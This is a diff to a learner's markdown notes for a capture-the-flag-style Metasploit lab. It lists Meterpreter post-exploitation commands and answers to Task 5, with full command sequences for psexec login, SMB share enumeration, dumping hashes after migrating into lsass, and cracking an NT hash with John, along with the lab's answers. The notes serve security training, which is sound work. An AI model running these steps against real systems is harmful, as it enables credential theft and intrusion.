@@ -212,17 +212,78 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
   - Migrating to another process may also help you to have a more stable Meterpreter session.
 > [!CAUTION]
 > You may lose your user privileges if you migrate from a higher privileged user to a process started by a lower privileged user.
-- `hashdump` - list content of the SAM database
+- `hashdump` - dumps content of the SAM database
   - SAM (Security Account Manager) stores user passwords on Windows systems.
   - Passwords are store in NTLM (New Technology LAN Manager) format.
 - `search -f` - locate files
 - `shell` - launch regular command-line shell on target system
+- `getsystem` - attempt to elevate your privilege to that of local system
 - Goals of post-exploitation phase:
-  - Gathering further information about the target system.
-  - Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
-  - Privilege escalation.
-  - Lateral movement.
+  - Gathering further information about the target system
+  - Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system
+  - Privilege escalation
+  - Lateral movement
   
 ## Questions
 ### Task 5
+You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
+> Username: ballen
+> Password: Password1
+- What is the computer name?
+  ```
+  use exploit/windows/smb/psexec
+  set rhosts <target_ip>
+  set smbpass Password1
+  set smbuser ballen
+  run
+  sysinfo
+  ```
+  > ACME-TEST
+- What is the target domain?
+  > FLASH
+- What is the name of the share likely created by the user?
+  ```
+  use auxiliary/scanner/smb/smb_enumshares
+  set rhosts <target_ip>
+  set smbpass Password1
+  set smbuser ballen
+  run
+
+  background
+  use post/windows/gather/enum_shares
+  set session <num>
+  run
+  ```
+  > speedster
+- What is the NTLM hash of the jchambers user?
+  
+  **?** Use `ps` to find PID of lsass.exe.
+  ```
+  migrate <PID>
+  hashdump
+  ```
+  > 69596c7aa1e8daee17f8e78870e25a5c
+- What is the cleartext password of the jchambers user?
+  
+  The third field contains the 'aad3b' string, so we use `--format=NT`. 
+  ```
+  echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt
+  john --format=NT --wordlist=<rockyou.txt> hash.txt
+  ```
+  > Trustno1
+- Where is the "secrets.txt"  file located? (Full path of the file)
+  ```
+  search -f secrets.txt
+  ```
+  > 
+
+
+
+
+
+
+
+
+
+
 
